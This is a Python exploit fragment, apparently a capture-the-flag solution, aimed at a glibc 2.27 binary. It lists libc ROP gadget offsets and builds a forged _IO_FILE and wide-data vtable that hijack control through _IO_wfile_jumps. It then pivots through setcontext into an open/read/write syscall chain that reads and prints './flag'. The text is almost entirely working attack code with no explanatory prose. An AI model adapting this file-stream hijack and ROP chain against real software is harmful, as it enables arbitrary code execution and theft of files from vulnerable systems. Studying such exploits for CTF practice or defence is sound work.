
#(Ubuntu GLIBC 2.27-3ubuntu1.6)=============================

setcontext_door = libcbase + libc.sym['setcontext'] + 53
_IO_wfile_jumps = libcbase + libc.sym['_IO_wfile_jumps']
_IO_list_all = libcbase + libc.sym['_IO_list_all']
bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret
gadget = libcbase + 0x157a40
ret = prdi_ret + 1 # ret
'''
mov rdi, qword ptr [rbx]; 
mov rax, qword ptr [rdi + 8]; 
call qword ptr [rax + 0x20];
'''

#=========================fake_IO_FILE=========================

IO_FILE_addr = heapbase + 0x670
_IO_wdoallocbuf_addr = IO_FILE_addr + 0x130

fake_IO_FILE  = p64(0) # _IO_read_end
fake_IO_FILE += p64(0) # _IO_read_base, _wide_data->_IO_write_base = 0
fake_IO_FILE += p64(0) # _IO_write_base
fake_IO_FILE += p64(1) # _IO_write_ptr
fake_IO_FILE += p64(0) # _IO_write_end, _wide_data->_IO_buf_base = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0x58, '\x00')
fake_IO_FILE += p64(0)  # _chain
fake_IO_FILE  = fake_IO_FILE.ljust(0x78, '\x00')
fake_IO_FILE += p64(heapbase + 0x200)  # _lock = writable address
fake_IO_FILE  = fake_IO_FILE.ljust(0x90, '\x00')
fake_IO_FILE += p64(IO_FILE_addr) # _wide_data
fake_IO_FILE  = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)  # _mode = 0
fake_IO_FILE  = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(_IO_wfile_jumps) # vtable = _IO_wfile_overflow
fake_IO_FILE  = fake_IO_FILE.ljust(0x120,'\x00')

#=====================fake_IO_wdoallocbuf======================

fake_IO_wdoallocbuf  = p64(_IO_wdoallocbuf_addr)
fake_IO_wdoallocbuf  = fake_IO_wdoallocbuf.ljust(0x68, '\x00')
fake_IO_wdoallocbuf += p64(gadget) #call [rax+0x68]

#==============================================================

context_addr = heapbase + 0x260
orw_addr = context_addr + 0x100
flag_addr = context_addr + 0x200

payload  = p64(0) + p64(context_addr) + p64(0)*2 + p64(setcontext_door)
payload  = payload.ljust(0xa0,'\x00')
payload += p64(orw_addr) #rsp
payload += p64(ret) #rcx
payload  = payload.ljust(0x100,'\x00')

#open
payload += p64(prdi_ret) + p64(flag_addr) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload = payload.ljust(0x200,'\x00') + './flag\x00\x00'
payload = payload.ljust(0x410,'\x00')

#==============================================================
